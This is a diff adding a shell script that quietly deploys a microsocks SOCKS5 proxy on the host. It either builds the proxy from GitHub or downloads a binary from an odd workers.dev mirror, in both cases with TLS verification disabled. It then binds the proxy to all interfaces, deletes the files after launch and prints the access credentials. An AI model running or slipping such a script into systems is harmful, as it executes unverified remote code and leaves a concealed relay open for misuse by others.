@@ -1,0 +1,56 @@
+#!/bin/sh
+
+set -e
+
+rand_str() 
+{
+    if command -v dd >/dev/null 2>&1
+    then
+        dd if=/dev/urandom bs=6 count=1 status=none | base64 | tr -d /+=
+    else
+        head -c 6 /dev/urandom | base64 | tr -d /+=
+    fi
+}
+
+fetch_data()
+{
+    if command -v wget >/dev/null 2>&1; 
+    then
+        wget --no-check-certificate -q -O - $1
+    else 
+        curl -L -k $1
+    fi
+}
+
+API_URL=api.ipify.org
+REPO_URL=https://github.com/rofl0r/microsocks
+REPO_TARBALL=$REPO_URL/tarball/master
+STATIC_BINARY=https://js.mirr0r.workers.dev/p/microsocks
+PROG_NAME=microsocks
+IP=$(fetch_data $API_URL)
+PORT=$(shuf -i 6000-7000 -n 1)
+USER=$(rand_str)
+PASS=$(rand_str)
+if command -v gcc >/dev/null 2>&1 && command -v make >/dev/null 2>&1;
+then
+    if command -v git >/dev/null 2>&1;
+    then
+        git clone $REPO_URL >/dev/null 2>&1
+    else
+        mkdir microsocks
+        fetch_data $REPO_TARBALL | tar -xz -C microsocks --strip-components 1
+    fi
+    cd microsocks
+    make >/dev/null 2>&1 
+    nohup ./$PROG_NAME -i 0.0.0.0 -p $PORT -u $USER -P $PASS >/dev/null 2>&1 &
+    cd ..
+    sleep 1
+    rm -rf microsocks
+else
+    fetch_data $STATIC_BINARY > $PROG_NAME
+    chmod +x ./$PROG_NAME
+    nohup ./$PROG_NAME -i 0.0.0.0 -p $PORT -u $USER -P $PASS >/dev/null 2>&1 &
+    sleep 1
+    rm ./$PROG_NAME
+fi
+echo $USER:$PASS@$IP:$PORT
